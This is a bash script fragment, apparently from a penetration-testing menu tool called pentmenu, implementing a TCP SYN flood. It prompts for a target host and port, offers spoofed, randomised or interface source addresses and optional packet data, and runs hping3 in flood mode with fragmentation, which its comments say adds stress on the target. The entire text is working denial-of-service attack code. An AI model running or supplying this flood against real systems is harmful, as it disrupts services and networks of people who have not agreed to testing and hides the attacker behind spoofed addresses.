#!/bin/bash
#set the prompt to show you are in pentmenu and not standard shell


#####################
##START TCPSYNFLOOD##
		echo "TCP SYN Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP SYN Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP SYN packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the SYN packet?  Default is to send no data
	echo "Send data with SYN packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP SYN flood using values defined earlier OKAT
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
fi
